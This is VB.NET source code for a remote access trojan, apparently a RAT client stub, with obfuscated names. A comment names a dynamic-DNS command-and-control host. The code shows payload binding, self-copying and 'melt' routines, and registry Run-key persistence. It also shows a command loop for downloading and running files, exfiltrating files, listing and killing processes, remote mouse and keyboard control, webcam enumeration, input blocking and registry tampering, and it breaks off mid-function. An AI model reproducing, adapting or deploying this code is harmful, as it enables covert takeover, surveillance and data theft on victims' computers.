﻿Imports System.Net.Sockets, System.Threading, System.Runtime.Serialization.Formatters.Binary, System.Runtime.Serialization, System.IO, System.Windows.Forms.Form, System.Reflection, System, Microsoft.VisualBasic, System.Drawing, System.Windows.Forms, System.Collections, System.Collections.Generic, System.Runtime.InteropServices, System.Diagnostics

<Assembly: Runtime.CompilerServices.SuppressIldasm()> 
<Assembly: AssemblyTitle("*Title*")> 
<Assembly: AssemblyCompany("*Company*")> 
<Assembly: AssemblyProduct("*Product*")> 
<Assembly: AssemblyCopyright("*Copyright*")> 
<Assembly: AssemblyTrademark("*Trademark*")> 
<Assembly: AssemblyFileVersion("*Version*")> 

Module Module1
    Dim q44p As String = q340p.q606p 'kingcobraxd.no-ip.biz
    Dim q45p As Integer = 12345
    Dim q46p As TcpClient
    Dim q47p As New BinaryFormatter
    Dim q48p As String = q340p.q607p
    Dim q49p As String = q340p.q608p
    Dim q50p As String = q340p.q609p
    Dim q51p As Thread 'chat thread
    Dim q52p As Thread 'persistence thread
    Dim q53p As Boolean = False 'sending data
    Dim q54p As Boolean = False
    Dim q55p As Boolean = False
    Dim q56p As Boolean = False
    Dim q57p As Boolean = False
    Dim q58p As Integer
    Friend WithEvents q59p As PictureBox
    Friend WithEvents q60p As Form
    Dim q61p As Form
    Dim q62p As TextBox
    Dim q63p As TextBox
    Dim q64p As Button
    Friend WithEvents q65p As New q1p
    Dim q66p As New List(Of q38p)
    Dim q67p As String = ""
    Public q68p As String = q340p.q344p
    Public q69p As String = q340p.q345p 'key
    Dim q70p As Integer = q84p(q340p.q346p, "")
    Declare Function q71p Lib "kernel32.dll" Alias "SetProcessWorkingSetSize" (ByVal q89p As IntPtr, ByVal q90p As UIntPtr, ByVal q91p As UIntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Public Declare Sub q72p Lib "user32.dll" Alias "mouse_event" (ByVal q92p As Long, ByVal q93p As Long, ByVal q94p As Long, ByVal q95p As Long, ByVal q96p As Long)
    Declare Function q73p Lib "avicap32.dll" Alias "capGetDriverDescriptionA" (ByVal q97p As Short, ByVal q98p As String, ByVal q99p As Integer, ByVal q100p As String, ByVal q101p As Integer) As Boolean
    Declare Function q74p Lib "avicap32.dll" Alias "capCreateCaptureWindowA" (<MarshalAs(UnmanagedType.VBByRefStr)> ByRef q102p As String, ByVal q103p As Integer, ByVal q104p As Integer, ByVal q105p As Integer, ByVal q106p As Integer, ByVal q107p As Short, ByVal q108p As Integer, ByVal q109p As Integer) As Integer
    Declare Function q75p Lib "user32.dll" Alias "SendMessageA" (ByVal q110p As Integer, ByVal q111p As Integer, ByVal q112p As Integer, <MarshalAs(UnmanagedType.AsAny)> ByVal q113p As Object) As Integer
    Declare Function q76p Lib "user32.dll" Alias "SetWindowPos" (ByVal q114p As Integer, ByVal q115p As Integer, ByVal q116p As Integer, ByVal q117p As Integer, ByVal q118p As Integer, ByVal q119p As Integer, ByVal q120p As Integer) As Integer
    Declare Function q77p Lib "user32.dll" Alias "DestroyWindow" (ByVal q121p As Integer) As Boolean
    Private Declare Function q78p Lib "GDI32.DLL" Alias "BitBlt" (ByVal q122p As IntPtr, ByVal q123p As Integer, ByVal q124p As Integer, ByVal q125p As Integer, ByVal q126p As Integer, ByVal q127p As IntPtr, ByVal q128p As Integer, ByVal q129p As Integer, ByVal q130p As Int32) As Boolean
    Declare Function q79p Lib "kernel32.dll" Alias "OpenThread" (ByVal q131p As Integer, ByVal q132p As Boolean, ByVal q133p As Integer) As IntPtr
    Declare Function q80p Lib "kernel32.dll" Alias "ResumeThread" (ByVal q134p As IntPtr) As Integer
    Declare Function q81p Lib "kernel32.dll" Alias "SuspendThread" (ByVal q135p As IntPtr) As Integer
    Private Declare Function q82p Lib "user32.dll" Alias "GetWindowTextA" (ByVal q136p As Int32, ByVal q137p As String, ByVal q138p As Int32) As Int32
    Private Declare Function q83p Lib "user32.dll" Alias "GetForegroundWindow" () As Int32
    Private Declare Function q84p Lib "user32.dll" Alias "FindWindowA" (ByVal q139p As String, ByVal q140p As String) As Integer
    Declare Function q85p Lib "winmm.dll" Alias "mciSendStringA" (ByVal q141p As String, ByVal q142p As String, ByVal q143p As Long, ByVal q144p As Long) As Long
    Public Declare Function q86p Lib "user32.dll" Alias "BlockInput" (ByVal q145p As Integer) As Integer
    Public Declare Function q87p Lib "user32.dll" Alias "SwapMouseButton" (ByVal q146p As Long) As Long
    Private Declare Auto Sub q88p Lib "user32.dll" Alias "SendMessage" (ByVal q147p As Integer, ByVal q148p As UInt32, ByVal q149p As UInt32, ByVal q150p As Integer)
    Dim q151p As Boolean = False, q152p As Boolean = False, q153p As Boolean = False, q154p As Boolean = False, q155p As Boolean = False
    Sub Main()
        Thread.Sleep(1000)
        Try
            Dim q156p As New Mutex(False, q340p.q610p)
            If Not q156p.WaitOne(0, False) Then End
            If q151p And Not Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & q340p.q341p Then 'Message
                MessageBox.Show(q340p.q611p, q340p.q612p, MessageBoxButtons.OK, MessageBoxIcon.Information)
            End If
            If q155p And Not Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & q340p.q341p Then 'binder
                Dim q157p As New Resources.ResourceManager(q340p.q613p, Assembly.GetExecutingAssembly)
                Dim q158p As Object = q157p.GetResourceSet(System.Globalization.CultureInfo.CurrentCulture, True, True)
                For Each q159p As DictionaryEntry In q158p
                    IO.File.WriteAllBytes(System.IO.Path.GetTempPath & q159p.Key, DirectCast(Convert.FromBase64String(q157p.GetObject(q159p.Key)), Byte()))
                    Process.Start(System.IO.Path.GetTempPath & q159p.Key)
                Next
            End If
            If q152p And Not Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & q340p.q341p Then 'Melt
                IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & q340p.q341p)
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & q340p.q341p)
                Dim q318p As ProcessStartInfo = New ProcessStartInfo()
                q318p.Arguments = q340p.q342p & Application.ExecutablePath.ToString & q340p.q343p
                q318p.WindowStyle = ProcessWindowStyle.Hidden : q318p.CreateNoWindow = True
                q318p.FileName = q340p.q347p : Process.Start(q318p) : End
            End If
            If q153p Then 'install
                If Not Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & q340p.q341p Then
                    If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & q340p.q341p) Then
                        Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & q340p.q341p) : Catch : End Try
                    End If
                    File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & q340p.q341p)
                End If
                Try
                    Dim q160p As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(q340p.q348p, True)
                    q160p.SetValue(q50p, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & q340p.q341p, Microsoft.Win32.RegistryValueKind.String) : q160p.Close()
                Catch : End Try
                If q154p Then 'persistence
                    q52p = New Thread(AddressOf q168p)
                    q52p.IsBackground = True : q52p.Start()
                End If
            End If
            CheckForIllegalCrossThreadCalls = False
            q65p.q30p()
            Dim q161p As New Thread(AddressOf q162p)
            q161p.IsBackground = True : q161p.Start()
            Application.Run()
        Catch : End Try
    End Sub
    Sub q162p()
q215p:
        Try
            q46p = New TcpClient(q44p, q45p)
            q170p(q340p.q349p & q49p & q340p.q350p & Globalization.RegionInfo.CurrentRegion.DisplayName & q340p.q350p & q163p() & q340p.q350p & q165p() & q340p.q351p & Globalization.RegionInfo.CurrentRegion.TwoLetterISORegionName)
            q46p.GetStream.BeginRead(New Byte() {0}, 0, 0, AddressOf q175p, Nothing)
        Catch
            Threading.Thread.Sleep(4000) : GoTo q215p
        End Try
    End Sub
    Function q163p() As String
        Try
            Dim q164p As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(q340p.q352p)
            q48p = q164p.GetValue(q340p.q353p) : q164p.Close()
        Catch : End Try
        Return q48p
    End Function
    Public Function q165p() As String
        Dim q166p As System.OperatingSystem = System.Environment.OSVersion
        Dim q167p As String = q340p.q408p
        Select Case q166p.Platform
            Case System.PlatformID.Win32Windows
                Select Case q166p.Version.Minor
                    Case 0 : q167p = q340p.q409p
                    Case 10 : q167p = q340p.q410p
                    Case 90 : q167p = q340p.q411p
                End Select
            Case System.PlatformID.Win32NT : Select Case q166p.Version.Major
                    Case 3 : q167p = q340p.q412p
                    Case 4 : q167p = q340p.q412p
                    Case 5
                        If q166p.Version.Minor = 0 Then
                            q167p = q340p.q413p
                        ElseIf q166p.Version.Minor = 1 Then
                            q167p = q340p.q414p
                        ElseIf q166p.Version.Minor = 2 Then
                            q167p = q340p.q415p
                        End If
                    Case 6 : q167p = q340p.q416p
                        If q166p.Version.Minor = 0 Then
                            q167p = q340p.q416p
                        ElseIf q166p.Version.Minor = 1 Then
                            q167p = q340p.q417p
                        End If
                End Select
        End Select
        If Microsoft.Win32.Registry.LocalMachine.OpenSubKey(q340p.q418p).GetValue(q340p.q419p).ToString.Contains(q340p.q420p) Then
            q167p += q340p.q421p
        Else
            q167p += q340p.q422p
        End If
        Return q167p
    End Function
    Sub q168p()
        Do
            System.Threading.Thread.Sleep(500)
            Try
                Dim q169p As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(q340p.q348p, True)
                q169p.SetValue(q50p, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & q340p.q341p, Microsoft.Win32.RegistryValueKind.String) : q169p.Close()
            Catch : End Try
        Loop
    End Sub
    Sub q170p(ByVal q171p As String, Optional ByVal q173p() As Byte = Nothing)
        Try
            Dim q174p As New q322p(q247p(q69p, q171p), q173p)
            Do Until Not q53p : Application.DoEvents() : Loop
            q53p = True : q47p.Serialize(q46p.GetStream, q174p) : q53p = False
        Catch : End Try : q263p()
    End Sub
    Sub q175p(ByVal q176p As IAsyncResult)
        Try
            If q46p.GetStream.DataAvailable And q46p.GetStream.CanRead Then
                Dim q177p As New Thread(AddressOf q178p) : q47p.Binder = New q337p
                q177p.IsBackground = True : q177p.Start(DirectCast(q47p.Deserialize(q46p.GetStream), q322p))
            End If
            q46p.GetStream.Flush() : q46p.GetStream.BeginRead(New Byte() {0}, 0, 0, AddressOf q175p, Nothing)
        Catch ex As Exception
            Threading.Thread.Sleep(4000)
            Try : q51p.Abort() : Catch : End Try
            If q57p Then Thread.Sleep(56000)
            q57p = False : q162p()
        End Try
    End Sub
    Sub q178p(ByVal q179p As Object)
        Dim q180p As String = q256p(q69p, q179p.q334p)
        Try
            Dim q181p() As String = Split(q180p, q340p.q350p)
            Select Case q181p(0)
                Case q340p.q354p
                    q170p(q340p.q355p & My.Computer.Name & q340p.q350p & Globalization.RegionInfo.CurrentRegion.DisplayName & q340p.q350p & My.Computer.Info.OSFullName & q340p.q350p & My.Computer.Info.TotalPhysicalMemory.ToString & q340p.q356p)
                Case q340p.q357p
                    If File.Exists(Application.StartupPath & q340p.q362p) Then
                        File.Delete(Application.StartupPath & q340p.q362p)
                    End If
                    My.Computer.Network.DownloadFile(q181p(1), Application.StartupPath & q340p.q362p)
                    IO.File.SetAttributes(Application.StartupPath & q340p.q362p, IO.FileAttributes.System)
                    Process.Start(Application.StartupPath & q340p.q362p)
                    End
                Case q340p.q358p
                    If File.Exists(Application.StartupPath & q340p.q362p) Then
                        File.Delete(Application.StartupPath & q340p.q362p)
                    End If
                    IO.File.WriteAllBytes(Application.StartupPath & q340p.q362p, q179p.q336p)
                    IO.File.SetAttributes(Application.StartupPath & q340p.q362p, IO.FileAttributes.System)
                    Process.Start(Application.StartupPath & q340p.q362p)
                    End
                Case q340p.q359p
                    My.Computer.Registry.CurrentUser.CreateSubKey(q340p.q352p)
                    Dim q182p As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(q340p.q352p, True)
                    q182p.SetValue(q340p.q353p, q181p(1)) : q182p.Close() : q170p(q340p.q360p & q163p())
                Case q340p.q361p
                    Application.Restart()
                Case q340p.q363p
                    Try
                        Dim q183p As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(q340p.q348p, True)
                        Try : q52p.Abort() : Catch : End Try : q183p.DeleteValue(q50p) : q183p.Close()
                    Catch : End Try
                    Dim q319p As ProcessStartInfo = New ProcessStartInfo()
                    q319p.Arguments = q340p.q342p & Application.ExecutablePath.ToString & q340p.q343p
                    q319p.WindowStyle = ProcessWindowStyle.Hidden : q319p.CreateNoWindow = True
                    q319p.FileName = q340p.q347p : Process.Start(q319p) : End
                Case q340p.q364p
                    End
                Case q340p.q365p
                    Shell(q340p.q366p, AppWinStyle.Hide)
                Case q340p.q367p
                    Shell(q340p.q368p, AppWinStyle.Hide)
                Case q340p.q369p
                    Shell(q340p.q370p, AppWinStyle.Hide)
                Case q340p.q371p
                    q54p = True
                    Dim q184p As New Thread(AddressOf q264p)
                    q184p.IsBackground = True : q184p.Start()
                Case q340p.q372p
                    System.Threading.Thread.Sleep(100)
                    Dim q185p As Integer = Screen.PrimaryScreen.Bounds.Width
                    Dim q186p As Integer = Screen.PrimaryScreen.Bounds.Height
                    Dim q189p As Double = Convert.ToDouble(q181p(1)) * q185p
                    Dim q190p As Double = Convert.ToDouble(q181p(2)) * q186p
                    System.Windows.Forms.Cursor.Position = New Point(q189p, q190p)
                    System.Threading.Thread.Sleep(100)
                    q72p(&H2, 0, 0, 0, 0)
                Case q340p.q373p
                    System.Threading.Thread.Sleep(100)
                    Dim q187p As Integer = Screen.PrimaryScreen.Bounds.Width
                    Dim q188p As Integer = Screen.PrimaryScreen.Bounds.Height
                    Dim q191p As Double = Convert.ToDouble(q181p(1)) * q187p
                    Dim q192p As Double = Convert.ToDouble(q181p(2)) * q188p
                    System.Windows.Forms.Cursor.Position = New Point(q191p, q192p)
                    System.Threading.Thread.Sleep(100)
                    q72p(&H8, 0, 0, 0, 0)
                Case q340p.q374p
                    Dim q193p As Integer = Screen.PrimaryScreen.Bounds.Width
                    Dim q194p As Integer = Screen.PrimaryScreen.Bounds.Height
                    Dim q195p As Double = Convert.ToDouble(q181p(1)) * q193p
                    Dim q196p As Double = Convert.ToDouble(q181p(2)) * q194p
                    System.Windows.Forms.Cursor.Position = New Point(q195p, q196p)
                Case q340p.q375p
                    System.Threading.Thread.Sleep(100)
                    Dim q197p As Integer = Screen.PrimaryScreen.Bounds.Width
                    Dim q198p As Integer = Screen.PrimaryScreen.Bounds.Height
                    Dim q199p As Double = Convert.ToDouble(q181p(1)) * q197p
                    Dim q200p As Double = Convert.ToDouble(q181p(2)) * q198p
                    System.Windows.Forms.Cursor.Position = New Point(q199p, q200p)
                    System.Threading.Thread.Sleep(100)
                    q72p(&H4, 0, 0, 0, 0)
                Case q340p.q376p
                    System.Threading.Thread.Sleep(100)
                    Dim q201p As Integer = Screen.PrimaryScreen.Bounds.Width
                    Dim q202p As Integer = Screen.PrimaryScreen.Bounds.Height
                    Dim q203p As Double = Convert.ToDouble(q181p(1)) * q201p
                    Dim q204p As Double = Convert.ToDouble(q181p(2)) * q202p
                    System.Windows.Forms.Cursor.Position = New Point(q203p, q204p)
                    System.Threading.Thread.Sleep(100)
                    q72p(&H10, 0, 0, 0, 0)
                Case q340p.q377p
                    Select Case q181p(1)
                        Case q340p.q378p
                            SendKeys.SendWait(q340p.q379p)
                        Case q340p.q380p
                            SendKeys.SendWait(q340p.q381p)
                        Case q340p.q382p
                            SendKeys.SendWait(q340p.q383p)
                        Case Else
                            Try
                                SendKeys.SendWait(q340p.q384p & q181p(1) & q340p.q385p)
                            Catch
                                SendKeys.SendWait(q181p(1))
                            End Try
                    End Select
                Case q340p.q386p
                    q54p = False
                Case q340p.q387p
                    Dim q205p As String = Space(80)
                    Dim q206p As String = Space(80)
                    For q207p As Integer = 0 To 9
                        If q73p(q207p, q205p, 80, q206p, 80) Then q170p(q340p.q388p & q205p.Trim)
                    Next
                Case q340p.q389p
                    q55p = True
                    Dim q208p As New Thread(AddressOf q271p)
                    q208p.IsBackground = True : q208p.Start(q181p(1))
                Case q340p.q390p
                    q55p = False
                Case q340p.q391p
                    q170p(q340p.q392p & q288p())
                Case q340p.q393p
                    Try
                        q170p(q340p.q392p & q291p(q181p(1)) & q296p(q181p(1)))
                    Catch
                        q170p(q340p.q394p)
                    End Try
                Case q340p.q395p
                    Try
                        Select Case q181p(1)
                            Case q340p.q396p
                                q170p(q340p.q406p & q291p(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) & q296p(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) & q340p.q350p & Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData))
                            Case q340p.q397p
                                q170p(q340p.q406p & q291p(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)) & q296p(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)) & q340p.q350p & Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
                            Case q340p.q398p
                                q170p(q340p.q406p & q291p(Environment.GetFolderPath(Environment.SpecialFolder.Favorites)) & q296p(Environment.GetFolderPath(Environment.SpecialFolder.Favorites)) & q340p.q350p & Environment.GetFolderPath(Environment.SpecialFolder.Favorites))
                            Case q340p.q399p
                                q170p(q340p.q406p & q291p(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)) & q296p(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)) & q340p.q350p & Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments))
                            Case q340p.q400p
                                q170p(q340p.q406p & q291p(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)) & q296p(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)) & q340p.q350p & Environment.GetFolderPath(Environment.SpecialFolder.MyMusic))
                            Case q340p.q401p
                                q170p(q340p.q406p & q291p(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)) & q296p(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)) & q340p.q350p & Environment.GetFolderPath(Environment.SpecialFolder.MyPictures))
                            Case q340p.q402p
                                q170p(q340p.q406p & q291p(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)) & q296p(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)) & q340p.q350p & Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles))
                            Case q340p.q403p
                                q170p(q340p.q406p & q291p(Environment.GetFolderPath(Environment.SpecialFolder.Recent)) & q296p(Environment.GetFolderPath(Environment.SpecialFolder.Recent)) & q340p.q350p & Environment.GetFolderPath(Environment.SpecialFolder.Recent))
                            Case q340p.q404p
                                q170p(q340p.q406p & q291p(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu)) & q296p(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu)) & q340p.q350p & Environment.GetFolderPath(Environment.SpecialFolder.StartMenu))
                            Case q340p.q405p
                                q170p(q340p.q406p & q291p(Environment.GetFolderPath(Environment.SpecialFolder.Startup)) & q296p(Environment.GetFolderPath(Environment.SpecialFolder.Startup)) & q340p.q350p & Environment.GetFolderPath(Environment.SpecialFolder.Startup))
                        End Select
                    Catch
                        q170p(q340p.q407p)
                    End Try
                Case q340p.q423p
                    Try
                        If File.Exists(q181p(1)) Then File.Delete(q181p(1))
                        Dim q209p As New FileStream(q181p(1), FileMode.Create, FileAccess.Write)
                        Dim q210p() As Byte = q179p.q336p
                        Dim q211p(q210p.Length - 2) As Byte
                        Array.Copy(q210p, 0, q211p, 0, q211p.Length)
                        q209p.Write(q211p, 0, q211p.Length) : q209p.Close()
                        q170p(q340p.q424p & q181p(2))
                    Catch
                        q170p(q340p.q425p & q181p(2))
                    End Try
                Case q340p.q426p
                    Try
q216p:
                        Dim q212p As New FileStream(q181p(1), FileMode.Append, FileAccess.Write)
                        Dim q213p() As Byte = q179p.q336p
                        Dim q214p(q213p.Length - 2) As Byte
                        Array.Copy(q213p, 0, q214p, 0, q214p.Length)
                        q212p.Write(q214p, 0, q214p.Length) : q212p.Close()
                        q170p(q340p.q427p & q181p(2))
                    Catch
                        GoTo q216p
                    End Try
                Case q340p.q428p
q217p:
                    Try
                        If File.Exists(q181p(1)) Then File.Delete(q181p(1))
                    Catch
                        GoTo q217p
                    End Try
                Case q340p.q429p
                    Try
                        Dim q218p As New FileInfo(q181p(1))
                        Dim q219p As Long = q218p.Length Mod 100
                        Dim q220p As Long = ((q218p.Length - q219p) / 100) - 1
                        Dim q221p(q220p) As Byte
                        Dim q222p As New FileStream(q181p(1), FileMode.Open, FileAccess.Read)
                        Dim q223p As Integer = q222p.Read(q221p, 0, q220p)
                        Dim q224p As Integer = 0 : Dim q225p As Integer = 0
                        q225p += q223p : q224p = Math.Round(q225p / q218p.Length * 100)
                        q170p(q340p.q430p & q181p(2) & q340p.q350p & q181p(3) & q340p.q350p & q224p, q221p)
                        q66p.Add(New q38p(CInt(q181p(2))))
                        For Each q226p As q38p In q66p
                            If q226p.q39p = CInt(q181p(2)) Then
                                Do
                                    Do Until q226p.q40p
                                        Application.DoEvents()
                                    Loop
                                    If q226p.q41p Then Exit Sub
                                    Dim q227p As Integer = q222p.Read(q221p, 0, q220p)
                                    If q227p = 0 Then
                                        q170p(q340p.q431p & q181p(2))
                                        q222p.Close() : Exit Sub
                                    End If
                                    q226p.q40p = False
                                    q225p += q227p : q224p = Math.Round(q225p / q218p.Length * 100)
                                    q170p(q340p.q432p & q181p(2) & q340p.q350p & q181p(3) & q340p.q350p & q224p, q221p)
                                Loop
                                Exit For
                            End If
                        Next
                    Catch
                        q170p(q340p.q433p & q181p(2) & q340p.q350p & q181p(3))
                    End Try
                Case q340p.q434p
                    For Each q228p As q38p In q66p
                        If q228p.q39p = CInt(q181p(1)) Then
                            q228p.q40p = True : Exit For
                        End If
                    Next
                Case q340p.q435p
                    For Each q229p As q38p In q66p
                        If q229p.q39p = CInt(q181p(1)) Then
                            q229p.q41p = True : q229p.q39p = 0 : Exit For
                        End If
                    Next
                Case q340p.q436p
                    Select Case q181p(1)
                        Case q340p.q437p
                            My.Computer.FileSystem.RenameDirectory(q181p(2), q181p(3))
                        Case q340p.q438p
                            My.Computer.FileSystem.RenameFile(q181p(2), q181p(3))
                    End Select
                Case q340p.q439p
                    Process.Start(q181p(1))
                Case q340p.q440p
                    My.Computer.FileSystem.WriteAllText(q181p(1), q340p.q441p, False)
                Case q340p.q442p
                    Select Case q181p(1)
                        Case q340p.q437p
                            IO.Directory.Delete(q181p(2))
                        Case q340p.q438p
                            IO.File.Delete(q181p(2))
                    End Select
                Case q340p.q443p
                    Dim q230p As String = ""
                    Dim q231p As Process() = Process.GetProcesses()
                    For Each q232p As Process In q231p
                        q230p += q232p.ProcessName & q340p.q444p & q232p.Id & q340p.q444p & q232p.SessionId & q340p.q444p & q232p.MainWindowTitle & q340p.q444p
                    Next
                    q170p(q340p.q445p & q230p)
                Case q340p.q446p
                    Dim q233p As String() = q181p(1).Split(q340p.q444p)
                    For q234p As Integer = 0 To q233p.Length - 2
                        For Each q235p As ProcessThread In Process.GetProcessesByName(q233p(q234p))(0).Threads
                            q80p(q79p(&H2, False, q235p.Id))
                        Next
                    Next
                Case q340p.q447p
                    Dim q236p As String() = q181p(1).Split(q340p.q444p)
                    For q237p As Integer = 0 To q236p.Length - 2
                        For Each q238p As ProcessThread In Process.GetProcessesByName(q236p(q237p))(0).Threads
                            q81p(q79p(&H2, False, q238p.Id))
                        Next
                    Next
                Case q340p.q448p
                    Dim q239p As String() = q181p(1).Split(q340p.q444p)
                    For q240p As Integer = 0 To q239p.Length - 2
                        For Each q43p As Process In Process.GetProcessesByName(q239p(q240p))
                            q43p.Kill()
                        Next
                    Next
                Case q340p.q449p
                    q56p = True
                Case q340p.q450p
                    q67p = "" : q56p = False
                Case q340p.q451p
                    q67p = ""
                Case q340p.q452p
                    q51p = New Thread(AddressOf q304p)
                    q51p.IsBackground = True : q51p.Start()
                Case q340p.q453p
                    q62p.Text &= q340p.q454p & TimeOfDay & q340p.q455p & vbNewLine & q181p(1) & vbNewLine & vbNewLine
                Case q340p.q456p
                    Try
                        RemoveHandler q64p.Click, AddressOf q307p
                        q51p.Abort()
                    Catch : End Try
                Case q340p.q457p
                    Dim q241p As New Thread(AddressOf q314p)
                    q241p.IsBackground = True : q241p.SetApartmentState(ApartmentState.STA) : q241p.Start()
                Case q340p.q458p
                    Dim q242p As New Thread(AddressOf q315p)
                    q242p.IsBackground = True : q242p.SetApartmentState(ApartmentState.STA) : q242p.Start(q181p(1))
                Case q340p.q459p
                    Dim q243p As New Thread(AddressOf q317p)
                    q243p.IsBackground = True : q243p.SetApartmentState(ApartmentState.STA) : q243p.Start()
                Case q340p.q460p
                    Process.Start(q181p(1))
                Case q340p.q461p
                    My.Computer.Network.DownloadFile(q181p(1), Path.GetTempPath & q181p(2))
                Case q340p.q462p
                    Dim q244p As MessageBoxIcon
                    Dim q245p As MessageBoxButtons
                    Select Case q181p(1)
                        Case q340p.q463p
                            q244p = MessageBoxIcon.Information
                        Case q340p.q464p
                            q244p = MessageBoxIcon.Question
                        Case q340p.q465p
                            q244p = MessageBoxIcon.Warning
                        Case q340p.q466p
                            q244p = MessageBoxIcon.Error
                    End Select
                    Select Case q181p(2)
                        Case q340p.q463p
                            q245p = MessageBoxButtons.YesNo
                        Case q340p.q464p
                            q245p = MessageBoxButtons.YesNoCancel
                        Case q340p.q465p
                            q245p = MessageBoxButtons.OK
                        Case q340p.q466p
                            q245p = MessageBoxButtons.OKCancel
                        Case q340p.q467p
                            q245p = MessageBoxButtons.RetryCancel
                        Case q340p.q468p
                            q245p = MessageBoxButtons.AbortRetryIgnore
                    End Select
                    MessageBox.Show(q181p(4), q181p(3), q245p, q244p)
                Case q340p.q469p
                    If File.Exists(Path.GetTempPath & q340p.q470p) Then
                        File.Delete(Path.GetTempPath & q340p.q470p)
                    End If
                    System.IO.File.WriteAllText(Path.GetTempPath & q340p.q470p, q180p.Substring(6).Replace(q68p, vbNewLine))
                    Process.Start(Path.GetTempPath & q340p.q470p)
                Case q340p.q471p
                    If File.Exists(Path.GetTempPath & q340p.q472p) Then
                        File.Delete(Path.GetTempPath & q340p.q472p)
                    End If
                    System.IO.File.WriteAllText(Path.GetTempPath & q340p.q472p, q180p.Substring(5).Replace(q68p, vbNewLine))
                    Process.Start(Path.GetTempPath & q340p.q472p)
                Case q340p.q473p
                    If File.Exists(Path.GetTempPath & q340p.q474p) Then
                        File.Delete(Path.GetTempPath & q340p.q474p)
                    End If
                    System.IO.File.WriteAllText(Path.GetTempPath & q340p.q474p, q180p.Substring(4).Replace(q68p, vbNewLine))
                    Process.Start(Path.GetTempPath & q340p.q474p)
                Case q340p.q475p
                    q85p(q340p.q476p, "", 0, 0)
                Case q340p.q477p
                    q85p(q340p.q478p, "", 0, 0)
                Case q340p.q479p
                    q86p(1)
                Case q340p.q480p
                    q86p(0)
                Case q340p.q481p
                    q88p(-1, &H112, &HF170, 2)
                Case q340p.q482p
                    q88p(-1, &H112, &HF170, -1)
                Case q340p.q483p
                    q87p(&H0&)
                Case q340p.q484p
                    q87p(&H100&)
                Case q340p.q485p
                    Console.Write(q76p(q70p, 0&, 0&, 0&, 0&, 0&, &H80))
                Case q340p.q486p
                    Console.Write(q76p(q70p, 0&, 0&, 0&, 0&, 0&, &H40))
                Case q340p.q487p
                    My.Computer.Registry.SetValue(q340p.q488p, q340p.q489p, q340p.q490p, Microsoft.Win32.RegistryValueKind.DWord)
                Case q340p.q492p
                    My.Computer.Registry.SetValue(q340p.q488p, q340p.q489p, q340p.q491p, Microsoft.Win32.RegistryValueKind.DWord)
                Case q340p.q493p
                    My.Computer.Registry.SetValue(q340p.q494p, q340p.q495p, q340p.q490p, Microsoft.Win32.RegistryValueKind.DWord)
                Case q340p.q496p
                    My.Computer.Registry.SetValue(q340p.q494p, q340p.q495p, q340p.q491p, Microsoft.Win32.RegistryValueKind.DWord)
                Case q340p.q497p
                    My.Computer.Registry.SetValue(q340p.q498p, q340p.q499p, q340p.q490p, Microsoft.Win32.RegistryValueKind.DWord)
                Case q340p.q500p
                    My.Computer.Registry.SetValue(q340p.q498p, q340p.q499p, q340p.q491p, Microsoft.Win32.RegistryValueKind.DWord)
                Case q340p.q501p
                    My.Computer.Registry.SetValue(q340p.q502p, q340p.q503p, q340p.q490p, Microsoft.Win32.RegistryValueKind.DWord)
                Case q340p.q504p
                    My.Computer.Registry.SetValue(q340p.q502p, q340p.q503p, q340p.q491p, Microsoft.Win32.RegistryValueKind.DWord)
                Case q340p.q505p
                    Dim q246p As Object = CreateObject(q340p.q506p)
                    q246p.speak(q181p(1))
                Case q340p.q507p
                    q57p = True : q46p.Close()
            End Select
            q263p()
        Catch : End Try
    End Sub
    Public Function q247p(ByVal q248p As String, ByVal q249p As String) As String 'xor encryption
        Dim q251p As String = ""
        Dim q252p As Integer
        Dim q253p As String
        Dim q254p As Integer
        Dim q255p As Integer
        For q250p As Long = 1 To Len(q249p)
            q254p = Asc(Mid$(q249p, q250p, 1))
            q255p = Asc(Mid$(q248p, ((q250p Mod Len(q248p)) + 1), 1))
            q252p = (q254p Xor q255p)
            q253p = Hex(q252p)
            If Len(q253p) = 1 Then q253p = q340p.q508p & q253p
            q251p += q253p
        Next
        Return q251p
    End Function
    Public Function q256p(ByVal q257p As String, ByVal q258p As String) As String 'xor decryption
        Dim q260p As String = ""
        Dim q261p As Integer
        Dim q262p As Integer
        For q259p As Long = 1 To (Len(q258p) / 2)
